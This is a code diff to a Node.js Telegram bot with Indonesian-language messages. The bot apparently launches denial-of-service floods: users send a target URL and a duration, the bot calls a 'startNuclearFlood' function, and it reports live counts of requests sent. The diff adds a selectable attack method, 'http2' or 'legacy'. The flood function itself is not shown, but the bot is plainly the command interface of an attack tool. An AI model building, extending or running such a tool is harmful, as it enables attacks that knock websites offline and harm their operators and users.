@@ -62,8 +62,11 @@ bot.on('callback_query', (callbackQuery) => {
         const promptMessage = `
 Silakan masukkan target dan durasi serangan.
 
-*Format:* \`https://example.com 200\`
-(URL diikuti spasi, lalu durasi dalam detik)
+*Format:* \`https://example.com 200 [metode]\`
+
+*URL:* Alamat target. 
+*Durasi:* Waktu serangan dalam detik.
+*Metode (opsional):* \`http2\` (default) atau \`legacy\`.
         `;
         
         bot.sendMessage(chatId, promptMessage, { parse_mode: 'Markdown' });
@@ -116,13 +119,14 @@ bot.on('message', async (msg) => {
 
         const parts = text.split(' ');
 
-        if (parts.length !== 2 || !parts[0].startsWith('http') || isNaN(parseInt(parts[1]))) {
-            bot.sendMessage(chatId, "❌ *Format salah!*\nMohon masukkan dengan benar, contoh: `https://example.com 300`", { parse_mode: 'Markdown' });
+        if (parts.length < 2 || parts.length > 3 || !parts[0].startsWith('http') || isNaN(parseInt(parts[1]))) {
+            bot.sendMessage(chatId, "❌ *Format salah!*\nMohon masukkan dengan benar, contoh: `https://example.com 300 legacy`", { parse_mode: 'Markdown' });
             return;
         }
 
         const url = parts[0];
         const duration = parseInt(parts[1]);
+        const attackType = parts[2] === 'legacy' ? 'legacy' : 'http2';
 
         delete userState[chatId];
 
@@ -134,7 +138,7 @@ bot.on('message', async (msg) => {
             const statusText = `
 ✅ *Serangan Sedang Berjalan*
 
-*Target:* \`${url}\`
+*Target:* \`${url}\` (\`${attackType}\`)
 *Durasi Sisa:* \`${stats.secondsRemaining} detik\`
 -----------------------------------
 *Requests Terkirim:* \`${stats.totalSent.toLocaleString()}\`
@@ -152,7 +156,7 @@ bot.on('message', async (msg) => {
             }
         };
 
-        const attackControls = startNuclearFlood(url, duration, statusCallback);
+        const attackControls = startNuclearFlood(url, duration, attackType, statusCallback);
         
         const finishTimeout = setTimeout(() => {
             const finalText = `
